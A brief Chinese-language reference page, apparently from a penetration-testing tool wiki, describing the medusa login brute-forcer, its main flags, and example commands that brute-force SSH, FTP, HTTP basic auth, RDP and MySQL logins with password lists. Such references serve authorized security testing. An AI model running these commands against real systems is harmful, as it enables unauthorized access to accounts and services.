# medusa

## 简介
快速并行的网络登录暴力破解工具

## 核心参数
- `-h`: 目标主机
- `-u/-U`: 用户名/用户名列表
- `-p/-P`: 密码/密码列表
- `-M`: 指定模块（协议）

## 命令示例
```bash
# SSH 暴力破解
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# FTP 暴力破解
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp

# HTTP 基本认证暴力破解
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -m DIR:/admin

# RDP 暴力破解
medusa -h 192.168.1.100 -u administrator -P passwords.txt -M rdp

# MySQL 暴力破解
medusa -h 192.168.1.100 -u root -P passwords.txt -M mysql

# 多线程爆破
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -t 4
```

## 使用场景
支持多种协议的并行暴力破解

## 所属分类
- [暴力破解 (Brute Force)](../categories/07-brute-force.md)
